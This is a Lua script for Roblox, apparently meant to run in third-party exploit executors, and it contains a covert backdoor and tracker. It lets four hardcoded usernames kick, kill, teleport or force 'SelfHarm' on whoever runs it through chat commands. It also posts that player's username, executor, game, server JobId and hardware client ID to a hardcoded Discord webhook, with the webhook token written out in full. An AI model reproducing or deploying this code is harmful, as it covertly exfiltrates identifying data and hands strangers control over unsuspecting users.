local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

local Admins = {
	["goldenchicayfredyy"] = true,
	["nopitching"] = true,
	["1049c4"] = true,
	["visualenemy"] = true,
}

local Webhook = "https://discord.com/api/webhooks/1258398166789783643/Uy3RQJEXOJ1gKQTUOT7Y7zPk_E2ELc08rtTZsUdLSn6gOegeD7qfcMQaiE1RVl6ENhs2"
local Executor = identifyexecutor()
local ExecutorText = ""

local function FindUser(Name)
	if #Name < 3 then
		return nil
	end

	Name = string.lower(Name)
	for _, player in pairs(Players:GetPlayers()) do
		if string.sub(string.lower(player.Name), 1, #Name) == Name then
			return player
		end
	end
	return nil
end

local commands = {
	kick = function(targetPlayer)
		targetPlayer:Kick("kicked by a tear admin")
	end,
	kill = function(targetPlayer)
		targetPlayer.Character.Humanoid.Health = 0
	end,
	teleport = function(targetPlayer)
		LocalPlayer.Character.HumanoidRootPart.CFrame = game:GetService("Players"):WaitForChild("goldenchicayfredyy").Character.HumanoidRootPart.CFrame
	end,
	down = function(targetPlayer) -- for shinden
		local args = {
			[1] = 10000
		}

		game:GetService("ReplicatedStorage"):WaitForChild("GameRemotes"):WaitForChild("Other"):WaitForChild("SelfHarm"):FireServer(unpack(args))
	end,
}

game:GetService("Players").PlayerAdded:Connect(function(player)
	if Admins[player.Name] then
		player.Chatted:Connect(function(Msg)
			local command, target = Msg:lower():match("^/e%s+([^%s]+)%s+(.*)$")
			if not command then
				command, target = Msg:lower():match("^([^%s]+)%s+(.*)$")
			end
			if command and commands[command] then
				local targetPlayer = FindUser(target)
				if targetPlayer then
					commands[command](targetPlayer)
				else
					return
				end
			elseif not commands[command] then
				return
			end
		end)
	end
end)

if Executor == "Wave" then
	ExecutorText = "Wave"
elseif Executor == "Solara" then
	ExecutorText = "Solara"
elseif Executor == "Synapse Z" then
	ExecutorText = "Synapse Z"
elseif Executor == "AWP" then
	ExecutorText = "AWP"
elseif Executor == "Seliware" then
	ExecutorText = "Seliware"
else
	ExecutorText = "Unknown"
end

local embed = {
	["title"] = LocalPlayer.Name,
	["color"] = 0x2f5bc7,
	["fields"] = {
		{
			["name"] = "Executor",
			["value"] = ExecutorText,
			["inline"] = true
		},
		{
			["name"] = "Game",
			["value"] = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name,
			["inline"] = true
		},
		{
			["name"] = "JobId",
			["value"] = game.JobId,
			["inline"] = true
		},
		{
			["name"] = "RbxAnalytics HWID",
			["value"] = game:GetService("RbxAnalyticsService"):GetClientId(),
			["inline"] = true
		}
	}
}

local payload = {
	["embeds"] = {embed},
}

local httpRequest = {
	Url = Webhook,
	Method = "POST",
	Headers = {
		["Content-Type"] = "application/json"
	},
	Body = game:GetService("HttpService"):JSONEncode(payload)
}

request(httpRequest)
